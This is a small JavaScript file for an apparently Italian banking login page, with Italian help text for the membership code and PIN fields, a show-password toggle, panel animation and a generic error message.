//alert('importato');

window.onload = function(){
	openPanel();
};

function togglePasswordVisibility() { 
  var passwordInput = document.getElementById('pin'); 
  var toggleIcon = document.getElementById('toggleIcon'); 
  if (passwordInput.type === "password") { 
    passwordInput.type = "text"; 
    toggleIcon.classList.remove('fa-eye'); 
    toggleIcon.classList.add('fa-eye-slash'); 
  } else { 
    passwordInput.type = "password"; 
    toggleIcon.classList.remove('fa-eye-slash'); 
    toggleIcon.classList.add('fa-eye'); 
  } 
}

function openPanel() {
  document.getElementById("pannello").style.width = "53vw";
  document.getElementById("pannello").style.padding = "60px 120px 120px";
}

function closePanel() {
  document.getElementById("pannello").style.width = "0";
  document.getElementById("pannello").style.padding = "0";

}

function ShowInfo1(){
  document.getElementById('text1').innerHTML = 'Inserisci qui il codice di adesione che ti è stato assegnato al momento della firma del contratto e che trovi stampato sul contratto stesso. Il codice di adesione non è modificabile ed è costituito da 8 cifre (nel caso in cui le cifre del tuo codice fossero meno, anteponi lo 0 per un numero di volte tale da costituire un totale di 8 cifre). Puoi trovare il tuo codice di adesione anche all’interno della tua App, accedi alla sezione Comunicazioni (tasto / cerchio in alto a destra con le iniziali o con la foto profilo) e seleziona la voce Il mio Profilo.';
}

function ShowInfo2(){
  document.getElementById('text2').innerHTML = 'Inserisci qui il codice PIN che hai scelto per accedere al Servizio. Ricorda che puoi modificarlo ulteriormente dalla tua Area riservata. Se si tratta di primo accesso inserire il PIN consegnato dalla Banca e procedere alla modifica dello stesso.';
}


function writeError(){
  
  document.getElementById('errore').innerHTML = " Siamo spiacenti, si è verificato un errore imprevisto. In caso di operazioni dispositive ti invitiamo a controllarne l’esecuzione prima di riproporle. Nel caso il problema si verificasse nuovamente, ti preghiamo di contattare il nostro Servizio Clienti.";
}